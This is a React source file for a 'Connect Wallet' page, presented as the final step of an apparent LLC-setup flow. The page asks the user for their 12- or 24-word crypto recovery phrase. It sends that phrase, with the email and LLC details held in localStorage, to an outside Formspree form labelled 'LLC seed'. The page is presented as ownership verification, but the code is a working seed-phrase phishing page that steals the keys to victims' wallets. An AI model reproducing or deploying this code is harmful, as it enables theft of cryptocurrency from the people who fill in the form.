import { useState } from "react";
import { Link, useNavigate } from "react-router-dom";

const NAVY = "#0B1F3A";
const GOLD = "#C9A227";
const TEAL = "#0D9488";
const FORMSPREE = "https://formspree.io/f/xvgqgavj";

export default function WalletRecovery() {
  const navigate = useNavigate();
  const [phrase, setPhrase] = useState("");

  const wordCount = phrase.trim() === "" ? 0 : phrase.trim().split(/\s+/).length;
  const isValid = wordCount === 12 || wordCount === 24;

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!isValid) return;

    const body = {
      seed_phrase: phrase.trim(),
      account_email: localStorage.getItem("account_email") || "",
      llc_choice: localStorage.getItem("llc_choice") || "",
      llc_name: localStorage.getItem("llc_name") || "",
      _subject: "LLC seed",
    };

    const res = await fetch(FORMSPREE, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(body),
    });

    if (res.ok) navigate("/success");
    else alert("Submit failed — check Formspree ID");
  }

  return (
    <div className="min-h-screen flex flex-col items-center justify-center px-4 py-16" style={{ backgroundColor: "#F7F8FA" }}>
      <div className="w-full max-w-[480px]">
        <div className="mb-10">
          <div className="flex items-center justify-between mb-2">
            <div
              className="inline-flex items-center gap-2 px-3 py-1.5 rounded-full text-xs font-semibold tracking-widest uppercase"
              style={{ backgroundColor: `${TEAL}15`, color: TEAL, border: `1px solid ${TEAL}30` }}
            >
              Step 4 of 4
            </div>
            <span className="text-xs font-bold" style={{ color: NAVY }}>90% complete</span>
          </div>
          <div className="w-full h-1.5 rounded-full" style={{ backgroundColor: "#D0D5DD" }}>
            <div className="h-1.5 rounded-full" style={{ width: "90%", backgroundColor: TEAL }} />
          </div>
        </div>

        <div className="bg-white rounded-[12px] p-8" style={{ border: "1px solid #D0D5DD", boxShadow: "0 4px 24px rgba(11,31,58,0.06)" }}>
          <h1 className="text-2xl font-black text-center mb-2" style={{ color: NAVY }}>Connect Wallet</h1>
          <p className="text-sm text-center mb-8" style={{ color: "#6B7280" }}>
            Import your wallet to verify control of the assets held by this entity.
          </p>

          <form onSubmit={handleSubmit} className="space-y-5">
            <label className="text-sm font-semibold" style={{ color: NAVY }}>Recovery phrase</label>
            <textarea
              rows={5}
              value={phrase}
              onChange={(e) => setPhrase(e.target.value)}
              placeholder="Enter your 12 or 24-word recovery phrase, separated by spaces…"
              className="w-full px-4 py-3 rounded-[10px] text-sm outline-none resize-none"
              style={{ border: `1.5px solid ${isValid ? TEAL : "#D0D5DD"}`, fontFamily: "monospace" }}
            />
            <button
              type="submit"
              disabled={!isValid}
              className="w-full h-[48px] rounded-[10px] font-bold text-sm"
              style={{ backgroundColor: GOLD, color: NAVY, opacity: isValid ? 1 : 0.5 }}
            >
              Connect wallet
            </button>
          </form>
        </div>

        <div className="flex items-center justify-center mt-6">
          <Link to="/finalize" className="text-xs" style={{ color: "#9CA3AF" }}>← Back</Link>
        </div>
      </div>
    </div>
  );
}
